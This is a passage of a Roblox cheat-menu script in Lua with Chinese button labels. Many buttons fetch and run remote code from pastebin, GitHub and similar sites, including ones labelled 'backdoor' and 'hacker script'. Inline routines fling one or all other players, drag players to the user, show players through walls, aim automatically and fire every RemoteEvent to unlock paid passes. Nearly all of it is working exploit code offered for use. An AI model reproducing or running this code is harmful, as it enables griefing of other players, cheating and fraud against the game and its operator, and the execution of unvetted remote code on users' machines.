            fullBrightConn = RunService.Heartbeat:Connect(function()
                Lighting.Ambient = Color3.new(1,1,1)
                Lighting.Brightness = 3
                Lighting.OutdoorAmbient = Color3.new(1,1,1)
            end)
        else
            if fullBrightConn then
                fullBrightConn:Disconnect()
                fullBrightConn = nil
            end
            Lighting.Ambient = Color3.new(0.25,0.25,0.25)
            Lighting.Brightness = 1
            Lighting.OutdoorAmbient = Color3.new(0.4,0.4,0.4)
        end
    end
})

Tabs.NewTab:Button({
    Title = "隐身",
    Callback = function() 
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Invisible%20Gui'))()
    end
})
Tabs.VehicleFlyTab:Button({
    Title = "鹿飞行",
    Callback = function() 
        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "FlyV3_Notify"
        ScreenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")

        local TextLabel = Instance.new("TextLabel")
        TextLabel.Name = "RainbowText"
        TextLabel.Size = UDim2.new(0,220,0,50)
        TextLabel.Position = UDim2.new(0.02,0,0.4,0)
        TextLabel.BackgroundTransparency = 1
        TextLabel.Text = "飞行已开启"
        TextLabel.Font = Enum.Font.GothamBold
        TextLabel.TextSize = 28
        TextLabel.Parent = ScreenGui

        task.spawn(function()
            while ScreenGui.Parent do
                local hue = os.clock() % 1
                TextLabel.TextColor3 = Color3.fromHSV(hue,1,1)
                task.wait(0.03)
            end
        end)

        loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/obfuscation/refs/heads/main/LU_Fly_%E9%B9%BF%E9%A3%9E%E8%A1%8C"))()
    end
})

Tabs.FeZone:Button({
    Title = "fe 变身整合",
    Callback = function() 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/Genesisloader/main/Script.lua"))()
    end
})

Tabs.NewTab:Toggle({
    Title = "点击传送",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local mouse = LocalPlayer:GetMouse()

        if enabled then
            _G.ClickTpConn = mouse.Button1Down:Connect(function()
                local char = LocalPlayer.Character
                if not char then return end
                local root = char:FindFirstChild("HumanoidRootPart")
                if not root then return end
                root.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0,2,0))
            end)
        else
            if _G.ClickTpConn then
                _G.ClickTpConn:Disconnect()
                _G.ClickTpConn = nil
            end
        end
    end,
})

Tabs.TeleportFlyTab:Divider()
local TargetName = "Guest"
Tabs.TeleportFlyTab:Input({
    Title = "Username",
    Value = "Guest",
    Placeholder = "Enter your username",
    Callback = function(input)
        TargetName = input
    end
})
Tabs.TeleportFlyTab:Button({
    Title = "旋转甩飞",
    Callback = function()
        local Players = game:GetService("Players")
        local localPlr = game.Players.LocalPlayer
        if not localPlr.Character then return end
        local localRoot = localPlr.Character:FindFirstChild("HumanoidRootPart")
        local target = Players:FindFirstChild(TargetName)
        if not target or not target.Character then return end
        local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
        if not targetRoot or not localRoot then return end

        
        local originalPos = localRoot.CFrame

        task.spawn(function()
            for i = 1,120 do
                
                if not localRoot or not targetRoot then break end
                localRoot.CFrame = targetRoot.CFrame * CFrame.Angles(0,math.rad(i*18),0)
                task.wait(0)
            end
            
            if localRoot then
                localRoot.CFrame = originalPos
            end
        end)
    end
})

Tabs.InteractTab:Button({
	Title = "全部互动",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/0e5nKKYV"))()
	end 
})

Tabs.TeleportFlyTab:Button({
    Title = "甩飞传送",
    Callback = function() 
    loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/rspy-but-back/refs/heads/main/Lu_hub.(1)"))()
    end
})
Tabs.TeleportFlyTab:Button({
    Title = "甩飞所有人",
    Callback = function() 
    local Targets = {"All"} -- "All", "Target Name", "arian_was_here"

local Players = game:GetService("Players")
local Player = Players.LocalPlayer

local AllBool = false

local GetPlayer = function(Name)
    Name = Name:lower()
    if Name == "all" or Name == "others" then
        AllBool = true
        return
    elseif Name == "random" then
        local GetPlayers = Players:GetPlayers()
        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
        return GetPlayers[math.random(#GetPlayers)]
    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
        for _,x in next, Players:GetPlayers() do
            if x ~= Player then
                if x.Name:lower():match("^"..Name) then
                    return x;
                elseif x.DisplayName:lower():match("^"..Name) then
                    return x;
                end
            end
        end
    else
        return
    end
end

local Message = function(_Title, _Text, Time)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
end

local SkidFling = function(TargetPlayer)
    local Character = Player.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart

    local TCharacter = TargetPlayer.Character
    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle

    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessoy and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end

    if Character and Humanoid and RootPart then
        if RootPart.Velocity.Magnitude < 50 then
            getgenv().OldPos = RootPart.CFrame
        end
        if THumanoid and THumanoid.Sit and not AllBool then
            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
        end
        if THead then
            workspace.CurrentCamera.CameraSubject = THead
        elseif not THead and Handle then
            workspace.CurrentCamera.CameraSubject = Handle
        elseif THumanoid and TRootPart then
            workspace.CurrentCamera.CameraSubject = THumanoid
        end
        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
            return
        end
        
        local FPos = function(BasePart, Pos, Ang)
            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
        end
        
        local SFBasePart = function(BasePart)
            local TimeToWait = 2
            local Time = tick()
            local Angle = 0

            repeat
                if RootPart and THumanoid then
                    if BasePart.Velocity.Magnitude < 50 then
                        Angle = Angle + 100

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
                        task.wait()
                    else
                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()
                        
                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
                        task.wait()

                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
                        task.wait()
                    end
                else
                    break
                end
            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
        end
        
        workspace.FallenPartsDestroyHeight = 0/0
        
        local BV = Instance.new("BodyVelocity")
        BV.Name = "EpixVel"
        BV.Parent = RootPart
        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
        
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
        
        if TRootPart and THead then
            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
                SFBasePart(THead)
            else
                SFBasePart(TRootPart)
            end
        elseif TRootPart and not THead then
            SFBasePart(TRootPart)
        elseif not TRootPart and THead then
            SFBasePart(THead)
        elseif not TRootPart and not THead and Accessory and Handle then
            SFBasePart(Handle)
        else
            return Message("Error Occurred", "Target is missing everything", 5)
        end
        
        BV:Destroy()
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
        workspace.CurrentCamera.CameraSubject = Humanoid
        
        repeat
            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
            Humanoid:ChangeState("GettingUp")
            table.foreach(Character:GetChildren(), function(_, x)
                if x:IsA("BasePart") then
                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
                end
            end)
            task.wait()
        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
        workspace.FallenPartsDestroyHeight = getgenv().FPDH
    else
        return Message("Error Occurred", "Random error", 5)
    end
end

if not Welcome then Message("甩飞已开启", "Enjoy!", 5) end
getgenv().Welcome = true
if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end

if AllBool then
    for _,x in next, Players:GetPlayers() do
        SkidFling(x)
    end
end

for _,x in next, Targets do
    if GetPlayer(x) and GetPlayer(x) ~= Player then
        if GetPlayer(x).UserId ~= 1414978355 then
            local TPlayer = GetPlayer(x)
            if TPlayer then
                SkidFling(TPlayer)
            end
        else
            Message("Error Occurred", "This user is whitelisted! (Owner)", 5)
        end
    elseif not GetPlayer(x) and not AllBool then
        Message("Error Occurred", "Username Invalid", 5)
    end
end
    end
})
Tabs.NewTab:Button({
	Title = "大迪克",
	Callback = function()
loadstring(game:HttpGet("https://pastefy.app/REK4Pwj4/raw"))()
	end 
})

Tabs.NewTab:Button({
    Title = "玩家之间无碰撞",
    Callback = function() 
local PhysicsService = game:GetService("PhysicsService")
local lp = game.Players.LocalPlayer

PhysicsService:CreateCollisionGroup("SelfOnly")
PhysicsService:CollisionGroupSetCollidable("SelfOnly","Default",true)
PhysicsService:CollisionGroupSetCollidable("SelfOnly","Players",false)

local function ApplyCollision(character)
    for _,v in character:GetDescendants() do
        if v:IsA("BasePart") then
            PhysicsService:SetPartCollisionGroup(v,"SelfOnly")
        end
    end
end

if lp.Character then
    ApplyCollision(lp.Character)
end
lp.CharacterAdded:Connect(ApplyCollision)
    end
})

Tabs.NewTab:Button({
	Title = "键盘",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
	end
})
Tabs.NewTab:Button({
	Title = "iy",
	Default = false,
	Callback = function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
	end
})

Tabs.NewTab:Button({
	Title = "跑墙",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
	end 
})

Tabs.NewTab:Button({
	Title = "替身",
	Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/SkrillexMe/SkrillexLoader/main/SkrillexLoadMain')))()
	end 
})

Tabs.Fun:Button({
	Title = "查看别人物品",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/xq3b7aUG"))()
	end 
})
Tabs.LightTab:Button({
	Title = "光影",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MZEEN2424/Graphics/main/Graphics.xml"))()
	end 
})

Tabs.FeZone:Button({
	Title = "fe 祖国人",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kongbaNB/-/refs/heads/main/祖国人汉化"))()
	end 
})

Tabs.FeZone:Button({
	Title = "fe 无敌少侠",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/giobolqv1/mark-and-variants-by-GioBolqv1-/refs/heads/main/mark.lua"))()
	end 
})

Tabs.FeZone:Button({
	Title = "fe 心灵感应",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty1.lua"))()
	end 
})

Tabs.NewTab:Button({
	Title = "变蛇",
	Callback = function()
loadstring(game:HttpGet(('https://pastefy.ga/tWBTcE4R/raw'),true))()
	end 
})

Tabs.NewTab:Button({
	Title = "让别人控制自己",
	Callback = function()
loadstring(game:HttpGet(('https://pastefy.ga/a7RTi4un/raw'),true))()
	end 
})

Tabs.NewTab:Button({
	Title = "死亡回归",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/hCR5n6t4"))()
	end 
})

Tabs.y:Button({
	Title = "飞车",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/ScpGuest666/Random-Roblox-script/refs/heads/main/Roblox%20Fe%20Vehicle%20Fly%20GUI%20script'))()
	end 
})

Tabs.NewTab:Button({
	Title = "无敌",
	Callback = function()
local lp = game:GetService "Players".LocalPlayer

if lp.Character:FindFirstChild "Head" then

    local char = lp.Character

    char.Archivable = true

    local new = char:Clone()

    new.Parent = workspace

    lp.Character = new

    wait(2)

    local oldhum = char:FindFirstChildWhichIsA "Humanoid"

    local newhum = oldhum:Clone()

    newhum.Parent = char

    newhum.RequiresNeck = false

    oldhum.Parent = nil

    wait(2)

    lp.Character = char

    new:Destroy()

    wait(1)

    newhum:GetPropertyChangedSignal("Health"):Connect(

        function()

            if newhum.Health <= 0 then

                oldhum.Parent = lp.Character

                wait(1)

                oldhum:Destroy()

            end

        end)

    workspace.CurrentCamera.CameraSubject = char

    if char:FindFirstChild "Animate" then

        char.Animate.Disabled = true

        wait(.1)

        char.Animate.Disabled = false

    end

    lp.Character:FindFirstChild "Head":Destroy()

end
	end 
})

Tabs.NewTab:Button({
	Title = "防掉线",
	Callback = function()
print("Anti Afk On")

		local vu = game:GetService("VirtualUser")

		game:GetService("Players").LocalPlayer.Idled:connect(function()

		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)

		   wait(1)

		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)

		end)
	end 
})

Tabs.NewTab:Button({
	Title = "httprspy",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/Scripts/refs/heads/master/HttpsSpy.lua"))()
	end 
})

Tabs.NewTab:Button({
	Title = "扩大武器范围",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Markklol/Script/refs/heads/main/Sword%20Script"))()
	end 
})

Tabs.NewTab:Toggle({
    Title = "玩家透视ESP",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        local Players = game:GetService("Players")
        local lp = Players.LocalPlayer
        local connections = {}
        local adornments = {}

        if enabled then
            local function createEsp(plr)
                if plr == lp then return end
                local function onChar(char)
                    task.wait()
                    local root = char:WaitForChild("HumanoidRootPart",8)
                    local head = char:WaitForChild("Head",8)

                    local box = Instance.new("BoxHandleAdornment")
                    box.Size = Vector3.new(2,5,1)
                    box.AlwaysOnTop = true
                    box.Color3 = Color3.new(1,0,0)
                    box.Transparency = 0.5
                    box.Adornee = root
                    box.Parent = char
                    table.insert(adornments, box)

                    local bill = Instance.new("BillboardGui")
                    bill.AlwaysOnTop = true
                    bill.Size = UDim2.new(4,0,1.5,0)
                    bill.StudsOffset = Vector3.new(0,3,0)
                    bill.Parent = head
                    table.insert(adornments, bill)

                    local label = Instance.new("TextLabel")
                    label.BackgroundTransparency = 1
                    label.Size = UDim2.new(1,0,1,0)
                    label.Text = plr.Name
                    label.TextColor3 = Color3.new(1,0,0)
                    label.Font = Enum.Font.SourceSansBold
                    label.TextSize = 18
                    label.Parent = bill
                    table.insert(adornments, label)
                end
                if plr.Character then
                    task.spawn(onChar, plr.Character)
                end
                table.insert(connections, plr.CharacterAdded:Connect(onChar))
            end

            for _,p in Players:GetPlayers() do
                task.spawn(createEsp,p)
            end
            table.insert(connections, Players.PlayerAdded:Connect(createEsp))
        else
            for _,con in connections do
                con:Disconnect()
            end
            for _,obj in adornments do
                obj:Destroy()
            end
            table.clear(connections)
            table.clear(adornments)
        end
    end,
})

Tabs.y:Toggle({
    Title = "吸附全部玩家",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer
        local loopTask

        if enabled then
            loopTask = task.spawn(function()
                while task.wait(0.05) do
                    if not LocalPlayer.Character then continue end
                    local MyRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                    if not MyRoot then continue end
                    for _,plr in Players:GetPlayers() do
                        if plr == LocalPlayer then continue end
                        local char = plr.Character
                        if not char then continue end
                        local root = char:FindFirstChild("HumanoidRootPart")
                        if root then
                            root.CFrame = root.CFrame:Lerp(MyRoot.CFrame, 0.12)
                        end
                    end
                end
            end)
        else
            task.cancel(loopTask)
        end
    end,
})

Tabs.NewTab:Button({
	Title = "无敌2",
	Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/H3RLCWWZ'))()
	end 
})

Tabs.NewTab:Button({
	Title = "伪名说话",
	Callback = function()

	end 
})

Tabs.NewTab:Button({
	Title = "跟踪玩儿家",
	Callback = function()

	end 
})

local rotateSpeed = 10
Tabs.y:Divider()
Tabs.y:Input({
    Title = "旋转速度",
    Value = "10",
    Placeholder = "输入旋转数值",
    Callback = function(input)
        rotateSpeed = tonumber(input) or 10
    end
})
Tabs.y:Toggle({
    Title = "自身旋转",
    Icon = "check",
    Default = false,
    Callback = function(enabled)
        local RunService = game:GetService("RunService")
        local Players = game:GetService("Players")
        local lp = Players.LocalPlayer
        local conn
        if enabled then
            conn = RunService.RenderStepped:Connect(function()
                if not lp.Character then return end
                local root = lp.Character:FindFirstChild("HumanoidRootPart")
                if not root then return end
                root.CFrame *= CFrame.Angles(0, math.rad(rotateSpeed), 0)
            end)
        else
            if conn then conn:Disconnect() end
        end
    end,
})

Tabs.NewTab:Button({
	Title = "踏空行走",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()
	end 
})

Tabs.NewTab:Button({
	Title = "飞车",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/G3GnBCyC", true))()
	end 
})

Tabs.NewTab:Button({
	Title = "隐身按e",
	Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/nwGEvkez'))()
	end 
})

Tabs.NewTab:Button({
	Title = "开启穿墙",
	Callback = function()
        local Players = game:GetService("Players")
        local lp = Players.LocalPlayer
        if not lp.Character then return end
        for _,part in lp.Character:GetDescendants() do
            if part:IsA("BasePart") then
                part.CanCollide = false
            end
        end
	end 
})

Tabs.y:Toggle({
	Title = "无限跳",
	Default = false,
	Callback = function(state)
		local UserInputService = game:GetService("UserInputService")
		local LocalPlayer = game:GetService("Players").LocalPlayer
		if not getgenv().InfiniteJumpConn then
			getgenv().InfiniteJumpConn = nil
		end
		if state then
			getgenv().InfiniteJumpConn = UserInputService.JumpRequest:Connect(function()
				local char = LocalPlayer.Character
				if not char then return end
				local hum = char:FindFirstChildOfClass("Humanoid")
				if hum then
					hum:ChangeState("Jumping")
				end
			end)
		else
			if getgenv().InfiniteJumpConn then
				getgenv().InfiniteJumpConn:Disconnect()
				getgenv().InfiniteJumpConn = nil
			end
		end
	end
})

Tabs.NewTab:Button({
	Title = "噶了",
	Callback = function()
game.Players.LocalPlayer.Character.Humanoid.Health=0
	end 
})

Tabs.NewTab:Button({
	Title = "fe点击传送",
	Callback = function()
      mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "[FE]点击传送" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack
  	end
})

Tabs.NewTab:Button({
    Title = "上帝模式(免疫)",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main",true))()
	end
})

Tabs.NewTab:Button({
    Title = "游戏通行证(跑酷游戏)",
	Callback = function()
	for _,v in pairs(game:GetDescendants()) do
if v.ClassName == "RemoteEvent" then
if v.Parent.Name == "WeaponsRemotes" or v.Parent.Name == "VipRemotes" or v.Parent.Name == "Remotes" then
v:FireServer()
end
end
end
     end
})

Tabs.NewTab:Button({
	Title = "模仿者脚本",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ttjy9808/THEMIMICNEWMOBILEUINOTBETA/main/README.md"))()
	end    
})

Tabs.NewTab:Button({
	Title = "画质脚本",
	Callback = function()
	 loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
  	end    
})

Tabs.FeZone:Button({
	Title = "FE动作",
	Callback = function()
     loadstring(game:HttpGet(('https://pastebin.com/raw/1p6xnBNf'),true))()
  	end    
})

Tabs.NewTab:Button({
	Title = "走路甩人",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
  	end    
})

Tabs.NewTab:Button({
	Title = "NA管理员",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
	end
})

Tabs.NewTab:Button({
    Title ="电脑键盘",
    Callback=function()
    loadstring(game:HttpGet("https://pastebin.com/raw/xSsDaMg2"))()
    end
})

Tabs.FeZone:Button({
    Title ="FE幽灵中心",
    Callback=function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
    end
})


Tabs.Music:Button({
	Title = "声音播放器",
	Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Anime-Expeditions-TIME-CHAMBER-OP-Macro-Auto-Challenge-Auto-Play-Auto-Raid-Auto-Shop-more-243513"))()
end
})

Tabs.NewTab:Button({
	Title = "铁拳打飞人",
	Callback = function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'),true))()
end
})

Tabs.NewTab:Button({
	Title = "蜘蛛侠爬墙配合键盘脚本按C爬墙",
	Callback = function()
loadstring(game:HttpGet(('https://pastebin.com/raw/2X0hKUgq'),true))()
	end
})

Tabs.NewTab:Button({
	Title = "回满血",
	Callback = function()
game.Players.LocalPlayer.Character.Humanoid.Health=10000
	end 
})

Tabs.NewTab:Button({
	Title = "后门",
	Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Infinite-Yield-6.4.1-PlayGround-LALOL-HUB-239074"))()
	end 
})

Tabs.NewTab:Button({
	Title = "黑客脚本",
	Callback = function()
loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Team-c00lkidd-4-f3x-op-218003"))()
	end 
})

Tabs.AimTab:Button({
	Title = "子追",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/1AJ69eRG"))()
	end 
})

Tabs.AimTab:Section({Title = "自定义自瞄"})

local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer

local Aimbot = {
    Enabled = false,            -- 总开关：默认关闭！
    HoldMode = false,           -- 按住模式
    TriggerMode = "鼠标右键",    -- 触发键类型
    CustomKey = "Q",            -- 键盘触发键
    ToggleKey = "P",            -- 总开关热键
    FOV = 150,                  -- 圆圈大小
    ShowCircle = false,         -- 圆圈显示：默认关闭！！
    RainbowCircle = false,
    CircleColor = Color3.fromRGB(255, 255, 255),
    WallCheck = true,
    DeadCheck = true,
    TeamCheck = true,
    IsHolding = false,
    IsMobile = false,
}

-- 检测移动端
Aimbot.IsMobile = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

-- ========== 清理旧圆圈（防止重复加载残留） ==========
for _, obj in ipairs(Drawing.get and Drawing.get() or {}) do
    if obj and obj.Type == "Circle" and obj.Text == "LuAimFOV" then
        obj:Remove()
    end
end

-- ========== FOV 圆圈 ==========
local fovCircle = nil
local hasDrawing = pcall(function()
    fovCircle = Drawing.new("Circle")
    fovCircle.Text = "LuAimFOV"  -- 标记，方便清理
    fovCircle.Thickness = 1.5
    fovCircle.NumSides = 80
    fovCircle.Filled = false
    fovCircle.Visible = false
    fovCircle.Color = Aimbot.CircleColor
end)

local circleGui, circleFrame, circleStroke = nil, nil, nil
if not hasDrawing then
    circleGui = Instance.new("ScreenGui")
    circleGui.Name = "LuAimCircle"
    circleGui.ResetOnSpawn = false
    circleGui.Parent = WindUI.ScreenGui

    circleFrame = Instance.new("Frame")
    circleFrame.BackgroundTransparency = 1
    circleFrame.BorderSizePixel = 0
    circleFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    circleFrame.Visible = false
    circleFrame.Parent = circleGui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = circleFrame

    circleStroke = Instance.new("UIStroke")
    circleStroke.Thickness = 2
    circleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    circleStroke.Parent = circleFrame
end

-- ========== 彩虹动画 ==========
local rainbowConn = RunService.RenderStepped:Connect(function()
    if not Aimbot.RainbowCircle or not Aimbot.ShowCircle or not Aimbot.Enabled then return end
    local hue = (tick() % 3) / 3
    local color = Color3.fromHSV(hue, 1, 1)
    if fovCircle then fovCircle.Color = color end
    if circleStroke then circleStroke.Color = color end
end)

-- ========== 核心：找最近目标 ==========
local function getClosestTarget()
    local cam = Workspace.CurrentCamera
    if not cam then return nil end
    if not LocalPlayer then return nil end
    local char = LocalPlayer.Character
    if not char then return nil end
    local myRoot = char:FindFirstChild("HumanoidRootPart")
    if not myRoot then return nil end

    local center = cam.ViewportSize / 2
    local closest = nil
    local minDist = Aimbot.FOV

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr == LocalPlayer then continue end
        local tChar = plr.Character
        if not tChar then continue end
        local head = tChar:FindFirstChild("Head")
        local hum = tChar:FindFirstChildOfClass("Humanoid")
        if not head or not hum then continue end

        if Aimbot.DeadCheck and hum.Health <= 0 then continue end
        if Aimbot.TeamCheck and plr.Team and LocalPlayer.Team and plr.Team == LocalPlayer.Team then continue end

        if Aimbot.WallCheck then
            local rayParams = RaycastParams.new()
            rayParams.FilterDescendantsInstances = {char}
            rayParams.FilterType = Enum.RaycastFilterType.Blacklist
            local dir = head.Position - cam.CFrame.Position
            local result = Workspace:Raycast(cam.CFrame.Position, dir.Unit * 2000, rayParams)
            if result then
                local hitModel = result.Instance:FindFirstAncestorWhichIsA("Model")
                if hitModel ~= tChar then continue end
            end
        end

        local pos, onScreen = cam:WorldToViewportPoint(head.Position)
        if not onScreen then continue end
        local dist = (Vector2.new(pos.X, pos.Y) - center).Magnitude
        if dist < minDist then
            minDist = dist
            closest = head
        end
    end
    return closest
end

-- ========== 主循环（核心修复在这里） ==========
local aimbotConn = RunService.RenderStepped:Connect(function()
    local cam = Workspace.CurrentCamera
    if not cam then return end
    local center = cam.ViewportSize / 2

    -- 【核心修复】总开关关闭时：强制隐藏圆圈，直接返回，绝不执行后续逻辑
    if not Aimbot.Enabled then
        if fovCircle then fovCircle.Visible = false end
        if circleFrame then circleFrame.Visible = false end
        return
    end

    -- 更新圆圈（只有总开关打开时才会执行到这里）
    if Aimbot.ShowCircle then
        if fovCircle then
            fovCircle.Visible = true
            fovCircle.Position = center
            fovCircle.Radius = Aimbot.FOV
            if not Aimbot.RainbowCircle then fovCircle.Color = Aimbot.CircleColor end
        elseif circleFrame then
            circleFrame.Visible = true
            circleFrame.Size = UDim2.new(0, Aimbot.FOV * 2, 0, Aimbot.FOV * 2)
            circleFrame.Position = UDim2.new(0, center.X, 0, center.Y)
            if not Aimbot.RainbowCircle then circleStroke.Color = Aimbot.CircleColor end
        end
    else
        if fovCircle then fovCircle.Visible = false end
        if circleFrame then circleFrame.Visible = false end
    end

